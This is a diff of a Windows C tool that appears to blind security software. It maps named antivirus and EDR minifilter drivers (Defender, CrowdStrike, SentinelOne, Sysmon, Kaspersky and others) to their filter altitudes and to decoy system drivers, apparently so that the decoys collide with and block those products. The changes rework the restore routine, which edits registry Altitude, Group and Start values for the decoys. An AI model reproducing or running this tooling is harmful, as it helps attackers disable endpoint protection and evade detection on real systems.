@@ -40,10 +40,17 @@ static BOOL DeleteRegValue(LPCSTR subKey, LPCSTR name)
 {
     HKEY hKey;
     LONG rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_SET_VALUE, &hKey);
-    if (rc != ERROR_SUCCESS) return FALSE;
+    if (rc != ERROR_SUCCESS) {
+        printf("    [-] Open %s\\%s failed (error %ld)\n", subKey, name, rc);
+        return FALSE;
+    }
     rc = RegDeleteValueA(hKey, name);
     RegCloseKey(hKey);
-    return rc == ERROR_SUCCESS;
+    if (rc != ERROR_SUCCESS && rc != ERROR_FILE_NOT_FOUND) {
+        printf("    [-] Delete %s failed (error %ld)\n", name, rc);
+        return FALSE;
+    }
+    return TRUE;
 }
 
 static BOOL SvcKeyExists(const char *svcName)
@@ -62,26 +69,23 @@ typedef struct {
     const char *altitude;
     const char *decoy;
     const char *decoyInstance;
-    const char *origAltitude;
-    DWORD       origStart;
-    const char *origGroup;
 } Target;
 
 static Target targets[] = {
-    {"defender",    "WdFilter",        "328010", "npsvctrig",  "npsvctrig",  "46000",  3, NULL},
-    {"mssecflt",    "MsSecFlt",        "385600", "WIMMount",   "WIMMount",   "385600", 0, "FSFilter Compression"},
-    {"sysmon",      "SysmonDrv",       "385201", "storqosflt", "storqosflt", "244000", 3, NULL},
-    {"crowdstrike", "csagent",         "328010", "npsvctrig",  "npsvctrig",  "46000",  3, NULL},
-    {"sentinelone", "SentinelMonitor", "385200", "CldFlt",     "CldFlt",     "180451", 0, "FSFilter HSM"},
-    {"carbonblack", "CbDefenseFilter", "328000", "Wof",        "Wof",        "40700",  0, "FSFilter Compression"},
-    {"sophos",      "SophosED",        "326000", "wcifs",      "wcifs",      "189900", 0, NULL},
-    {"eset",        "eamonm",          "328000", "Wof",        "Wof",        "40700",  0, "FSFilter Compression"},
-    {"kaspersky",   "klif",            "389800", "FileCrypt",  "FileCrypt",  "141100", 3, NULL},
-    {"trendmicro",  "TmFileEncDec",    "385300", "bindflt",    "bindflt",    "409800", 3, NULL},
-    {"elastic",     "ElasticEndpoint", "385700", "luafv",      "luafv",      "135000", 2, "FSFilter Virtualization"},
-    {"cortex",      "CyveraK",         "328010", "npsvctrig",  "npsvctrig",  "46000",  3, NULL},
-    {"cylance",     "CylanceDrv",      "385100", "storqosflt", "storqosflt", "244000", 3, NULL},
-    {"malwarebytes","MBAMSwissArmy",   "385100", "storqosflt", "storqosflt", "244000", 3, NULL},
+    {"defender",    "WdFilter",        "328010", "npsvctrig",  "npsvctrig"},
+    {"mssecflt",    "MsSecFlt",        "385600", "WIMMount",   "WIMMount"},
+    {"sysmon",      "SysmonDrv",       "385201", "storqosflt", "storqosflt"},
+    {"crowdstrike", "csagent",         "328010", "npsvctrig",  "npsvctrig"},
+    {"sentinelone", "SentinelMonitor", "385200", "CldFlt",     "CldFlt"},
+    {"carbonblack", "CbDefenseFilter", "328000", "Wof",        "Wof"},
+    {"sophos",      "SophosED",        "326000", "wcifs",      "wcifs"},
+    {"eset",        "eamonm",          "328000", "Wof",        "Wof"},
+    {"kaspersky",   "klif",            "389800", "FileCrypt",  "FileCrypt"},
+    {"trendmicro",  "TmFileEncDec",    "385300", "bindflt",    "bindflt"},
+    {"elastic",     "ElasticEndpoint", "385700", "luafv",      "luafv"},
+    {"cortex",      "CyveraK",         "328010", "npsvctrig",  "npsvctrig"},
+    {"cylance",     "CylanceDrv",      "385100", "storqosflt", "storqosflt"},
+    {"malwarebytes","MBAMSwissArmy",   "385100", "storqosflt", "storqosflt"},
 };
 #define TARGET_COUNT (sizeof(targets) / sizeof(targets[0]))
 
@@ -143,24 +147,19 @@ static BOOL DoRestore(Target *t)
     _snprintf(instKey, sizeof(instKey), "SYSTEM\\CurrentControlSet\\Services\\%s\\Instances\\%s",
               t->decoy, t->decoyInstance);
 
-    printf("[*] Restoring %s (altitude %s -> %s, Start -> %lu)\n",
-           t->decoy, t->altitude, t->origAltitude, t->origStart);
+    printf("[*] Restoring %s (delete Altitude, delete Group, Start -> 3)\n", t->decoy);
 
     if (!SvcKeyExists(t->decoy)) {
         printf("    [-] Driver %s not found\n\n", t->decoy);
         return FALSE;
     }
 
-    BOOL s1 = SetRegSz(instKey, "Altitude", t->origAltitude);
-    BOOL s2 = SetRegDword(svcKey, "Start", t->origStart);
-    BOOL s3;
-    if (t->origGroup)
-        s3 = SetRegSz(svcKey, "Group", t->origGroup);
-    else
-        s3 = DeleteRegValue(svcKey, "Group") || TRUE;
+    BOOL s1 = DeleteRegValue(instKey, "Altitude");
+    BOOL s2 = SetRegDword(svcKey, "Start", 3);
+    BOOL s3 = DeleteRegValue(svcKey, "Group");
 
     if (s1 && s2 && s3) {
-        printf("    [+] %s restored to defaults\n\n", t->decoy);
+        printf("    [+] %s restored\n\n", t->decoy);
         return TRUE;
     }
     printf("    [-] Partial failure\n\n");
@@ -208,9 +207,15 @@ int main(int argc, char *argv[])
                 else printf("[-] Unknown target: %s\n\n", argv[a]);
             }
         } else {
-            printf("[*] Restoring all decoy drivers to defaults...\n\n");
+            printf("[*] Restoring all decoy drivers...\n\n");
+            BOOL seen[TARGET_COUNT];
+            for (int i = 0; i < (int)TARGET_COUNT; i++) seen[i] = FALSE;
             int ok = 0;
             for (int i = 0; i < (int)TARGET_COUNT; i++) {
+                BOOL dup = FALSE;
+                for (int j = 0; j < i; j++)
+                    if (stricmp_local(targets[i].decoy, targets[j].decoy) == 0) { dup = TRUE; break; }
+                if (dup) continue;
                 if (SvcKeyExists(targets[i].decoy))
                     if (DoRestore(&targets[i])) ok++;
             }
